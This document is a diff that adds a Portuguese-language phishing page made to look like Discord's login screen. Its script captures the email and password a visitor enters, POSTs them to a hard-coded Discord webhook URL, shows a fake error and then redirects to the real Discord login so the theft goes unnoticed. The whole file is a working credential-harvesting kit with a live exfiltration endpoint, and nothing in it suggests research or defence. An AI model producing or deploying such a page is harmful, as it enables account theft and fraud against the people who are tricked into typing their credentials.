@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Discord</title>
+  <link rel="icon" href="https://cdn.discordapp.com/attachments/1366074867895762985/1366096203212918906/pngwing.com-removebg-preview.png?ex=680fb3bb&is=680e623b&hm=d1155edc5ea8b16577c983d2a5532159eb547037dbe14f41195b83a75afa8b88&" type="image/png">
+  <style>
+    body {
+      margin: 0;
+      background: #36393f;
+      font-family: "Arial", sans-serif;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: #2f3136;
+      padding: 40px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      animation: fadeIn 2s ease-in-out;
+    }
+    .logo img {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    input {
+      background: #202225;
+      border: none;
+      padding: 15px;
+      margin: 10px 0;
+      width: 250px;
+      color: white;
+      border-radius: 5px;
+      display: block;
+      font-size: 14px;
+    }
+    button {
+      background: #5865F2;
+      border: none;
+      padding: 15px 40px;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+      width: 100%;
+      font-size: 16px;
+    }
+    button:hover {
+      background: #4752c4;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .footer {
+      font-size: 12px;
+      margin-top: 20px;
+    }
+    .footer a {
+      color: #7289da;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    .error-message {
+      color: red;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">
+    <img src="https://cdn.discordapp.com/attachments/1366074867895762985/1366096203212918906/pngwing.com-removebg-preview.png?ex=680fb3bb&is=680e623b&hm=d1155edc5ea8b16577c983d2a5532159eb547037dbe14f41195b83a75afa8b88&" alt="Discord Logo">
+  </div>
+  <h2>Bem-vindo de volta!</h2>
+
+  <form id="form">
+    <input type="text" id="email" placeholder="Email ou número de telefone" required>
+    <input type="password" id="password" placeholder="Senha" required>
+    <button type="submit">Entrar</button>
+  </form>
+
+  <!-- Mensagem de erro -->
+  <div class="error-message" id="error-message" style="display:none;">
+    Por favor, repita esse processo de novo.
+  </div>
+
+  <div class="footer">
+    <a href="https://support.discord.com/hc/pt-br" target="_blank">Suporte</a> |
+    <a href="https://discord.com/terms" target="_blank">Termos</a> |
+    <a href="https://discord.com/privacy" target="_blank">Privacidade</a>
+  </div>
+</div>
+
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1366074997831110737/CpYFZv8v3GbVbsWdegpO-z2LFWWEr96QqmpAMe1E9_o1uC66eRdXwVIvI-4OrqatpbKs";
+
+  const form = document.getElementById('form');
+  const errorMessage = document.getElementById('error-message');
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    // Coleta os dados do formulário
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    // Envia os dados para o webhook
+    const payload = {
+      content: `Email/nome: ${email}\nSenha: ${password}`
+    };
+
+    // Enviar dados para o webhook
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    })
+    .then(response => {
+      if (response.ok) {
+        console.log("Dados enviados ao webhook com sucesso");
+      } else {
+        console.error("Erro ao enviar dados ao webhook");
+      }
+    })
+    .catch(error => {
+      console.error("Erro ao enviar dados:", error);
+    });
+
+    // Mostrar mensagem de erro
+    errorMessage.style.display = 'block';
+
+    // Atraso para redirecionar para o login do Discord
+    setTimeout(function() {
+      window.location.href = "https://discord.com/login";
+    }, 3000);  // Redireciona após 3 segundos
+  });
+</script>
+
+</body>
+</html>
